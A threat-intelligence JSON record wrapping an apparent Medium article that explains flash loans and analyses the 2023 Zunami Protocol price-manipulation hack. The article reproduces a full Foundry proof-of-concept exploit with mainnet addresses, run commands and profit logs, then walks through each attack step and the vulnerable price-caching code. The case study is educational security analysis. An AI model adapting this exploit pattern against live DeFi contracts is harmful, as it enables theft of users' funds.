{
    "threat_intelligence": {
        "url": "https://medium.com/@seyyedaliayati/understanding-flash-loan-attacks-through-a-practical-example-b2f9644e6012",
        "timestamp": "2023-08-14 00:00:00",
        "original_content": "Understanding Flash Loan Attacks Through a Practical Example\nA Comprehensive Case Study of a Flash Loan Attack\nIn this article, we delve into a detailed case study of a flash loan attack, aiming to achieve a comprehensive understanding of its mechanics and implications.\nFlash Loans\nSource: \nhttps://www.moonpay.com/learn/defi/defi-flash-loans\nFlash loans are a new concept in DeFi initially introduced by Marble in 2018 and later implemented and publicly used by Aave blockchain in 2020 [1]. In simple terms, flash loans allow users to borrow any amount of assets without providing collateral, as long as they return the borrowed amount within the same transaction. This might sound like a risky proposition, but the design of flash loans ensures that if the borrowed amount isn\u2019t returned within that single transaction, the entire transaction fails and is reverted, ensuring no funds are actually lost.\nThis unique mechanism has opened up a myriad of opportunities for arbitrage, collateral swapping, and other financial strategies within the DeFi space. The innovation not only showcases the flexibility of decentralized financial systems but also challenges traditional notions of lending and borrowing.\nThe following code demonstrates how to use a flash loan in our smart contract using Aave [2]:\npragma solidity \n0.8\n.10\n;\nimport\n \n\"https://github.com/aave/aave-v3-core/blob/master/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol\"\n;\nimport\n \n\"https://github.com/aave/aave-v3-core/blob/master/contracts/interfaces/IPoolAddressesProvider.sol\"\n;\nimport\n \n\"https://github.com/aave/aave-v3-core/blob/master/contracts/dependencies/openzeppelin/contracts/IERC20.sol\"\n;\ncontract SimpleFlashLoan is FlashLoanSimpleReceiverBase {\n    address payable owner;\n    \nconstructor\n(address _addressProvider)\n        \nFlashLoanSimpleReceiverBase\n(\nIPoolAddressesProvider\n(_addressProvider))\n    {\n    }\n    \nfunction \nfn_RequestFlashLoan\n(address _token, uint256 _amount)\n \npublic\n \n{\n        address receiverAddress = \naddress\n(\nthis\n);\n        address asset = _token;\n        uint256 amount = _amount;\n        bytes memory params = \n\"\"\n;\n        uint16 referralCode = \n0\n;\n        POOL.\nflashLoanSimple\n(\n            receiverAddress,\n            asset,\n            amount,\n            params,\n            referralCode\n        );\n    }\n    \n        \n    \nfunction  \nexecuteOperation\n(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address initiator,\n        bytes calldata params\n    )\n  external \noverride\n \nreturns\n \n(\nbool\n)\n \n{\n        \n        \n        \n        uint256 totalAmount = amount + premium;\n        \nIERC20\n(asset).\napprove\n(\naddress\n(POOL), totalAmount);\n        \nreturn\n \ntrue\n;\n    }\n    \nreceive\n() external payable {}\n}\nFlash Loan Attacks\nIntroducing flash loans was a double-edged sword. While they brought forth applications such as arbitrage, they also paved the way for significant attacks using flash loans. Some noteworthy instances include:\nOUSD attack with a lost value of $7.9M [3].\nValue Defi attack with a lost value of $6M+ [4].\nCheese Bank attack with a lost value of $3M [5].\nSuch incidents highlight the vulnerabilities inherent in the DeFi space, emphasizing the need for increased security measures and vigilance. The list of attacks unfortunately continues to grow as DeFi gains prominence.\nCase Study\nThe Zunami Protocol [6] was compromised in a hack resulting in a loss of over $2 million through the utilization of flash loans [7]. In the continuation of this article, we endeavor to comprehensively understand the nature of this attack.\nDefiHackLabs\nDeFiHackLabs is a GitHub repository [8] that provides a collection of tools and resources for learning about and debugging DeFi hacks. The repository includes code for reproducing 269 DeFi hack incidents, as well as transaction debugging tools, Ethereum signature databases, and other useful resources. The repository is maintained by SunWeb3Sec, a security research team focused on DeFi.\nThe repository is intended for educational purposes only and should not be used for illegal or malicious activities. The information in the repository should be used to learn about DeFi hacks and how to prevent them.\nProof of Concept\nHere is the PoC (Proof of Concept), which is a test case that exposes the vulnerability of the Zunami attack [9]. We will delve into the code in the following sections.\npragma solidity ^\n0.8\n.10\n;\nimport\n \n\"forge-std/Test.sol\"\n;\nimport\n \n\"./interface.sol\"\n;\ninterface\n \nIUZD\n \nis\n \nIERC20\n {\n    function cacheAssetPrice() \nexternal\n;\n}\ninterface\n \nICurve\n {\n    function exchange(\n        uint256 i,\n        uint256 j,\n        uint256 dx,\n        uint256 min_dy,\n        bool use_eth,\n        address receiver\n    ) \nexternal\n returns (uint256);\n}\ncontract ContractTest \nis\n Test {\n    IUZD UZD = IUZD(\n0xb40b6608B2743E691C9B54DdBDEe7bf03cd79f1c\n);\n    IERC20 WETH = IERC20(\n0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2\n);\n    IERC20 USDC = IERC20(\n0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48\n);\n    IERC20 crvUSD = IERC20(\n0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E\n);\n    IERC20 crvFRAX = IERC20(\n0x3175Df0976dFA876431C2E9eE6Bc45b65d3473CC\n);\n    IERC20 USDT = IERC20(\n0xdAC17F958D2ee523a2206206994597C13D831ec7\n);\n    IERC20 SDT = IERC20(\n0x73968b9a57c6E53d41345FD57a6E6ae27d6CDB2F\n);\n    IERC20 FRAX = IERC20(\n0x853d955aCEf822Db058eb8505911ED77F175b99e\n);\n    ICurvePool FRAX_USDC_POOL = ICurvePool(\n0xDcEF968d416a41Cdac0ED8702fAC8128A64241A2\n);\n    ICurvePool UZD_crvFRAX_POOL = ICurvePool(\n0x68934F60758243eafAf4D2cFeD27BF8010bede3a\n);\n    ICurvePool crvUSD_USDC_POOL = ICurvePool(\n0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E\n);\n    ICurvePool crvUSD_UZD_POOL = ICurvePool(\n0xfC636D819d1a98433402eC9dEC633d864014F28C\n);\n    ICurvePool Curve3POOL = ICurvePool(\n0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7\n);\n    ICurve ETH_SDT_POOL = ICurve(\n0xfB8814D005C5f32874391e888da6eB2fE7a27902\n);\n    Uni_Router_V2 sushiRouter = Uni_Router_V2(\n0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F\n);\n    Uni_Pair_V3 USDC_WETH_Pair = Uni_Pair_V3(\n0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640\n);\n    Uni_Pair_V3 USDC_USDT_Pair = Uni_Pair_V3(\n0x3416cF6C708Da44DB2624D63ea0AAef7113527C6\n);\n    IBalancerVault Balancer = IBalancerVault(\n0xBA12222222228d8Ba445958a75a0704d566BF2C8\n);\n    address MIMCurveStakeDao = \n0x9848EDb097Bee96459dFf7609fb582b80A8F8EfD\n;\n    function setUp() \npublic\n {\n        vm.createSelectFork(\n\"mainnet\"\n, \n17_908_949\n);\n        vm.label(address(WETH), \n\"WETH\"\n);\n        vm.label(address(USDC), \n\"USDC\"\n);\n        vm.label(address(UZD), \n\"UZD\"\n);\n        vm.label(address(crvUSD), \n\"crvUSD\"\n);\n        vm.label(address(crvFRAX), \n\"crvFRAX\"\n);\n        vm.label(address(USDT), \n\"USDT\"\n);\n        vm.label(address(FRAX), \n\"FRAX\"\n);\n        vm.label(address(FRAX_USDC_POOL), \n\"FRAX_USDC_POOL\"\n);\n        vm.label(address(UZD_crvFRAX_POOL), \n\"UZD_crvFRAX_POOL\"\n);\n        vm.label(address(crvUSD_USDC_POOL), \n\"crvUSD_USDC_POOL\"\n);\n        vm.label(address(crvUSD_UZD_POOL), \n\"crvUSD_UZD_POOL\"\n);\n        vm.label(address(Curve3POOL), \n\"Curve3POOL\"\n);\n        vm.label(address(ETH_SDT_POOL), \n\"ETH_SDT_POOL\"\n);\n        vm.label(address(sushiRouter), \n\"sushiRouter\"\n);\n        vm.label(address(USDC_WETH_Pair), \n\"USDC_WETH_Pair\"\n);\n        vm.label(address(USDC_USDT_Pair), \n\"USDC_USDT_Pair\"\n);\n        vm.label(address(Balancer), \n\"Balancer\"\n);\n        vm.label(address(MIMCurveStakeDao), \n\"MIMCurveStakeDao\"\n);\n    }\n    function testExploit() \nexternal\n {\n        USDC_USDT_Pair.flash(address(\nthis\n), \n0\n, \n7_000_000\n * \n1e6\n, abi.encode(\n7_000_000\n * \n1e6\n));\n        emit log_named_decimal_uint(\n            \n\"Attacker WETH balance after exploit\"\n, WETH.balanceOf(address(\nthis\n)), WETH.decimals()\n        );\n        emit log_named_decimal_uint(\n            \n\"Attacker USDT balance after exploit\"\n, USDT.balanceOf(address(\nthis\n)), USDT.decimals()\n        );\n    }\n    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata \ndata\n) \nexternal\n {\n        BalancerFlashLoan();\n        uint256 amount = abi.decode(\ndata\n, (uint256));\n        TransferHelper.safeTransfer(address(USDT), address(USDC_USDT_Pair), amount1 + amount);\n    }\n    function BalancerFlashLoan() \ninternal\n {\n        address[] memory tokens = new address[](\n2\n);\n        tokens[\n0\n] = address(USDC);\n        tokens[\n1\n] = address(WETH);\n        uint256[] memory amounts = new uint256[](\n2\n);\n        amounts[\n0\n] = \n7_000_000\n * \n1e6\n;\n        amounts[\n1\n] = \n10_011\n ether;\n        bytes memory userData = \n\"\"\n;\n        Balancer.flashLoan(address(\nthis\n), tokens, amounts, userData);\n    }\n    \n    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) \nexternal\n {\n        apporveAll();\n        uint256[\n2\n] memory amount;\n        amount[\n0\n] = \n0\n;\n        amount[\n1\n] = \n5_750_000\n * \n1e6\n;\n        uint256 crvFRAXBalance = FRAX_USDC_POOL.add_liquidity(amount, \n0\n); \n        UZD_crvFRAX_POOL.exchange(\n1\n, \n0\n, crvFRAXBalance, \n0\n, address(\nthis\n)); \n        crvUSD_USDC_POOL.exchange(\n0\n, \n1\n, \n1_250_000\n * \n1e6\n, \n0\n, address(\nthis\n)); \n        crvUSD_UZD_POOL.exchange(\n1\n, \n0\n, crvUSD.balanceOf(address(\nthis\n)), \n0\n, address(\nthis\n)); \n        ETH_SDT_POOL.exchange(\n0\n, \n1\n, \n11\n ether, \n0\n, \nfalse\n, address(\nthis\n)); \n        \n        \n        \n        \n        emit log_named_decimal_uint(\n            \n\"Before donation and reserve manipulation, UZD balance\"\n, UZD.balanceOf(address(\nthis\n)), WETH.decimals()\n        );\n        SDT.transfer(MIMCurveStakeDao, SDT.balanceOf(address(\nthis\n))); \n        swapToken1Totoken2(WETH, SDT, \n10_000\n ether); \n        uint256 value = swapToken1Totoken2(USDT, WETH, \n7_000_000\n * \n1e6\n); \n        UZD.cacheAssetPrice(); \n        emit log_named_decimal_uint(\n            \n\"After donation and reserve manipulation, UZD balance\"\n, UZD.balanceOf(address(\nthis\n)), WETH.decimals()\n        );\n        swapToken1Totoken2(SDT, WETH, SDT.balanceOf(address(\nthis\n))); \n        swapToken1Totoken2(WETH, USDT, value); \n        UZD_crvFRAX_POOL.exchange(\n0\n, \n1\n, UZD.balanceOf(address(\nthis\n)) * \n84\n / \n100\n, \n0\n, address(\nthis\n)); \n        crvUSD_UZD_POOL.exchange(\n0\n, \n1\n, UZD.balanceOf(address(\nthis\n)), \n0\n, address(\nthis\n)); \n        FRAX_USDC_POOL.remove_liquidity(crvFRAX.balanceOf(address(\nthis\n)), [uint256(\n0\n), uint256(\n0\n)]); \n        FRAX_USDC_POOL.exchange(\n0\n, \n1\n, FRAX.balanceOf(address(\nthis\n)), \n0\n); \n        crvUSD_USDC_POOL.exchange(\n1\n, \n0\n, crvUSD.balanceOf(address(\nthis\n)), \n0\n, address(\nthis\n)); \n        Curve3POOL.exchange(\n1\n, \n2\n, \n25_920\n * \n1e6\n, \n0\n); \n        uint256 swapAmount = USDC.balanceOf(address(\nthis\n)) - amounts[\n0\n];\n        USDC_WETH_Pair.swap(address(\nthis\n), \ntrue\n, int256(swapAmount), \n920_316_691_481_336_325_637_286_800_581_326\n, \n\"\"\n); \n        IERC20(tokens[\n0\n]).transfer(msg.sender, amounts[\n0\n] + feeAmounts[\n0\n]);\n        IERC20(tokens[\n1\n]).transfer(msg.sender, amounts[\n1\n] + feeAmounts[\n1\n]);\n    }\n    function apporveAll() \ninternal\n {\n        USDC.approve(address(FRAX_USDC_POOL), type(uint256).max);\n        crvFRAX.approve(address(UZD_crvFRAX_POOL), type(uint256).max);\n        UZD.approve(address(UZD_crvFRAX_POOL), type(uint256).max);\n        USDC.approve(address(crvUSD_USDC_POOL), type(uint256).max);\n        crvUSD.approve(address(crvUSD_USDC_POOL), type(uint256).max);\n        crvUSD.approve(address(crvUSD_UZD_POOL), type(uint256).max);\n        UZD.approve(address(crvUSD_UZD_POOL), type(uint256).max);\n        WETH.approve(address(ETH_SDT_POOL), type(uint256).max);\n        USDC.approve(address(Curve3POOL), type(uint256).max);\n        USDC.approve(address(USDC_WETH_Pair), type(uint256).max);\n        WETH.approve(address(sushiRouter), type(uint256).max);\n        SDT.approve(address(sushiRouter), type(uint256).max);\n        TransferHelper.safeApprove(address(USDT), address(sushiRouter), type(uint256).max);\n        FRAX.approve(address(FRAX_USDC_POOL), type(uint256).max);\n    }\n    function swapToken1Totoken2(IERC20 token1, IERC20 token2, uint256 amountIn) \ninternal\n returns (uint256) {\n        address[] memory path = new address[](\n2\n);\n        path[\n0\n] = address(token1);\n        path[\n1\n] = address(token2);\n        uint256[] memory values =\n            sushiRouter.swapExactTokensForTokens(amountIn, \n0\n, path, address(\nthis\n), block.timestamp);\n        \nreturn\n values[\n1\n];\n    }\n    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata \ndata\n) \nexternal\n {\n        USDC.transfer(msg.sender, uint256(amount0Delta));\n    }\n}\nSetup:\ncurl -L https://foundry.paradigm.xyz | bash\ngit \nclone\n git@github.com:SunWeb3Sec/DeFiHackLabs.git\ncd\n DeFiHackLabs\nRun:\nforge \ntest\n --contracts ./src/test/Zunami_exp.sol --evm-version \n'shanghai'\n -vvv\nLogs:\nRunning 1 test for src/test/Zunami_exp.sol:ContractTest\n[PASS] testExploit() (gas: 5443625)\nLogs:\n  Before donation and reserve manipulation, UZD balance: 4873316.591569740886823823\n  After donation and reserve manipulation, UZD balance: 16902957.773155665803499610\n  Attacker WETH balance after exploit: 1152.913811977198057525\n  Attacker USDT balance after exploit: 1275.238963\nTest result: ok. 1 passed; 0 failed; 0 skipped; finished in 173.34s\nRan 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)\nExploring the Attack: A Detailed Walkthrough\nScreenshot of \nhttps://github.com/SunWeb3Sec/DeFiHackLabs#20230814-zunamiprotocol---price-manipulation\nStep 1:\n Borrow 7,000,000 USDT from the \nUniswapV3\n, 7,000,000 USDC and 10,011 WETH from the \nBalancer\nUSDC_USDT_Pair.\nflash\n(\naddress\n(\nthis\n), \n0\n, \n7\n_000_000 * \n1e6\n, abi.\nencode\n(\n7\n_000_000 * \n1e6\n));\nfunction \nuniswapV3FlashCallback\n(uint256 amount0, uint256 amount1, bytes calldata data)\n external \n{\n    \nBalancerFlashLoan\n();\n    uint256 amount = abi.\ndecode\n(data, (uint256));\n    TransferHelper.\nsafeTransfer\n(\naddress\n(USDT), \naddress\n(USDC_USDT_Pair), amount1 + amount);\n}\nfunction \nBalancerFlashLoan\n()\n internal \n{\n    address[] memory tokens = \nnew\n address[](\n2\n);\n    tokens[\n0\n] = \naddress\n(USDC);\n    tokens[\n1\n] = \naddress\n(WETH);\n    uint256[] memory amounts = \nnew\n uint256[](\n2\n);\n    amounts[\n0\n] = \n7\n_000_000 * \n1e6\n;\n    amounts[\n1\n] = \n10\n_011 ether;\n    bytes memory userData = \n\"\"\n;\n    Balancer.\nflashLoan\n(\naddress\n(\nthis\n), tokens, amounts, userData);\n}\nStep 2:\n Add liquidity in the \nCruveFinance:Swap\n with 5,750,000 USDC and mint ~5,746,896 the GrvFRAX, then swap ~5,746,896 CrVFRAX for ~ 4,082,046 UZD and 1,250,000 USDC for ~791,280 UZD in the Curve.\nuint256[\n2\n] memory amount;\namount[\n0\n] = \n0\n;\namount[\n1\n] = \n5\n_750_000 * \n1e6\n;\nuint256 crvFRAXBalance = FRAX_USDC_POOL.\nadd_liquidity\n(amount, \n0\n);\nUZD_crvFRAX_POOL.\nexchange\n(\n1\n, \n0\n, crvFRAXBalance, \n0\n, \naddress\n(\nthis\n)); \ncrvUSD_USDC_POOL.\nexchange\n(\n0\n, \n1\n, \n1\n_250_000 * \n1e6\n, \n0\n, \naddress\n(\nthis\n)); \nStep 3 [Price Manipulation]:\n Swap 11 WETH for ~55,981 ST in the Curve, then donate all SDT (~55,598) into the \nMIMCurveStakeDao\n.\nETH_SDT_POOL.\nexchange\n(\n0\n, \n1\n, \n11\n ether, \n0\n, \nfalse\n, \naddress\n(\nthis\n)); \nSDT.\ntransfer\n(MIMCurveStakeDao, SDT.\nbalanceOf\n(\naddress\n(\nthis\n)));\nStep 4 [Price Manipulation]:\n Swap 10,000 WETH for ~58,043 SDT and 7,000,000 USDT for ~2,154 WETH in the \nSushiSwap\n.\nswapToken1Totoken2(WETH, SDT, \n10_000\n ether);\nuint256\n \nvalue\n \n=\n swapToken1Totoken2(USDT, WETH, \n7_000_000\n * \n1e6\n);\nStep 5:\n Cache the price snapshot in the UZD via the function \ncachessetPrice\n (the price cached has already been manipulated)\nUZD.\ncacheAssetPrice\n();\nLet\u2019s explore the vulnerable code:\nfunction \ncacheAssetPrice\n() \npublic\n \nvirtual\n {\n    _blockCached = block.number;\n    uint256 currentAssetPrice = assetPrice();\n    \nif\n (_assetPriceCached < currentAssetPrice) {\n        _assetPriceCached = currentAssetPrice;\n        \nemit \nCachedAssetPrice\n(\n_blockCached, _assetPriceCached\n)\n;\n    }\n}\nfunction \nassetPrice\n() \npublic\n view \noverride\n \nreturns\n (\nuint256\n)\n {\n    \nreturn\n priceOracle.lpPrice();\n}\nconstructor(address priceOracle_) {\n    _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);\n    require(priceOracle_ != address(\n0\n), \n'Zero price oracle'\n);\n    priceOracle = IAssetPriceOracle(priceOracle_);\n    cacheAssetPrice();\n}\nWhat is the address of the \npriceOracle\n? We should see where the \nZunamiElasticRigidVault\n is initialized or used:\npragma solidity ^\n0.8\n.0\n;\nimport\n \n'./ZunamiElasticRigidVault.sol'\n;\ncontract UZD is ZunamiElasticRigidVault {\n    address \npublic\n constant ZUNAMI = \n0x2ffCC661011beC72e1A9524E12060983E74D14ce\n;\n    \nconstructor\n()\n        \nElasticERC20\n(\n'UZD Zunami Stable'\n, \n'UZD'\n)\n        \nElasticRigidVault\n(\nIERC20Metadata\n(ZUNAMI))\n        \nZunamiElasticRigidVault\n(ZUNAMI)\n    {}\n}\nLet\u2019s explore the \nlpPrice\n function in the \npriceOracle\n with address \n0x2ffCC661011beC72e1A9524E12060983E74D14ce\n:\nfunction \nlpPrice\n()\n external view \nreturns\n \n(uint256)\n \n{\n    \nreturn\n (\ntotalHoldings\n() * \n1e18\n) / \ntotalSupply\n();\n}\nfunction \ntotalHoldings\n()\n \npublic\n view \nreturns\n \n(uint256)\n \n{\n    uint256 length = _poolInfo.length;\n    uint256 totalHold = \n0\n;\n    \nfor\n (uint256 pid = \n0\n; pid < length; pid++) {\n        totalHold += _poolInfo[pid].strategy.\ntotalHoldings\n();\n    }\n    \nreturn\n totalHold;\n}\nSo, when the attacker donates to MIMCurveStakeDao, the price of UZD inflates and since the function \nbalanceOf\n in the UZD contract relies on the incorrect price in the cache, the balance of the ATTACKER is inflated now!\nStep 6:\n Reverse all operations for manipulating the price of UZD and swap all UZD inflated to profit.\nswapToken1Totoken2(SDT, WETH, SDT.balanceOf(address(\nthis\n)));\nswapToken1Totoken2(WETH, USDT, value);\nUZD_crvFRAX_POOL.exchange(\n0\n, \n1\n, UZD.balanceOf(address(\nthis\n)) * \n84\n / \n100\n, \n0\n, address(\nthis\n));\ncrvUSD_UZD_POOL.exchange(\n0\n, \n1\n, UZD.balanceOf(address(\nthis\n)), \n0\n, address(\nthis\n)); \nFRAX_USDC_POOL.remove_liquidity(crvFRAX.balanceOf(address(\nthis\n)), [uint256(\n0\n), uint256(\n0\n)]); \nFRAX_USDC_POOL.exchange(\n0\n, \n1\n, FRAX.balanceOf(address(\nthis\n)), \n0\n); \ncrvUSD_USDC_POOL.exchange(\n1\n, \n0\n, crvUSD.balanceOf(address(\nthis\n)), \n0\n, address(\nthis\n)); \nCurve3POOL.exchange(\n1\n, \n2\n, \n25_920\n * \n1e6\n, \n0\n); \nuint256 swapAmount = USDC.balanceOf(address(\nthis\n)) - amounts[\n0\n];\nUSDC_WETH_Pair.swap(address(\nthis\n), \ntrue\n, int256(swapAmount), \n920_316_691_481_336_325_637_286_800_581_326\n, \n\"\"\n); \nIERC20(tokens[\n0\n]).transfer(msg.sender, amounts[\n0\n] + feeAmounts[\n0\n]);\nIERC20(tokens[\n1\n]).transfer(msg.sender, amounts[\n1\n] + feeAmounts[\n1\n]);\nWhat is Price Oracle?\nIn the context of web3 and blockchain technology, a price oracle serves as a crucial component that provides real-world data to smart contracts and decentralized applications (dApps). Smart contracts on blockchains like Ethereum are self-executing agreements with predefined rules. They can\u2019t access data from outside the blockchain on their own, which makes them dependent on external sources to obtain information.\nA price oracle specifically focuses on providing accurate and up-to-date price information for various assets, such as cryptocurrencies, traditional fiat currencies, commodities, stocks, and more. This price data is important for executing actions within smart contracts that involve value transfer or decision-making based on price fluctuations.\nSummary\nIf we took a look at the provided references [10, 11] we can understand that the attack is a \nPrice Manipulation attack\n on the \nZunami protocol\n, resulting in a loss of \nover $2.1 million\n. The attack involved two transactions, which were part of the exploit.\nhttps://etherscan.io/tx/0x2aec4fdb2a09ad4269a410f2c770737626fb62c54e0fa8ac25e8582d4b690cca\nhttps://etherscan.io/tx/0x0788ba222970c7c68a738b0e08fb197e669e61f9b226ceec4cab9b85abe8cceb\nThe primary method of attack was exploiting a flaw in the calculation of the LP price within the \ntotalHoldings\n function of strategies like \nMIMCurveStakeDao\n. The attacker artificially inflated \nsdt\n and \nsdtPrice\n, leading to \nincorrect price calculation\n.\nThe second transaction of the attack yielded the most profit, resulting in a gain of approximately 1152 ETH.\nFollowing the attack, the stolen funds were washed through another platform, \nTornadoCash\n. An encrypted hash related to the attack was also mentioned, but its actual content or purpose wasn\u2019t disclosed.\nConclusion [Written by ChatGPT]\nIn a recent DeFi attack, a vulnerability in the Zunami Protocol led to a loss of over $2 million. The attacker exploited a flaw in the LP price calculation within certain strategies, artificially inflating prices and reaping significant profits. The attack involved multiple transactions, including manipulating UZD token prices and utilizing flash loans to borrow assets. By skillfully manipulating the price oracle and the vulnerable protocol, the attacker managed to siphon off substantial funds. This incident underscores the ongoing vulnerabilities in the DeFi space and \nthe need for continuous security measures and vigilance\n.\nReferences\nCao, Y., Zou, C., & Cheng, X. (2021). Flashot: a snapshot of flash loan attack on DeFi ecosystem. arXiv preprint arXiv:2102.00626.\nhttps://www.quicknode.com/guides/defi/lending-protocols/how-to-make-a-flash-loan-using-aave\nhttps://medium.com/@matthewliu/urgent-ousd-has-hacked-and-there-has-been-a-loss-of-funds-7b8c4a7d534c\nhttps://www.coindesk.com/markets/2020/11/14/value-defi-suffers-6m-flash-loan-attack/\nhttps://peckshield.medium.com/cheese-bank-incident-root-cause-analysis-d076bf87a1e7\nhttps://twitter.com/ZunamiProtocol\nhttps://decrypt.co/152366/zunami-protocol-curve-finance-hack\nhttps://github.com/SunWeb3Sec/DeFiHackLabs\nhttps://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Zunami_exp.sol"
    }
}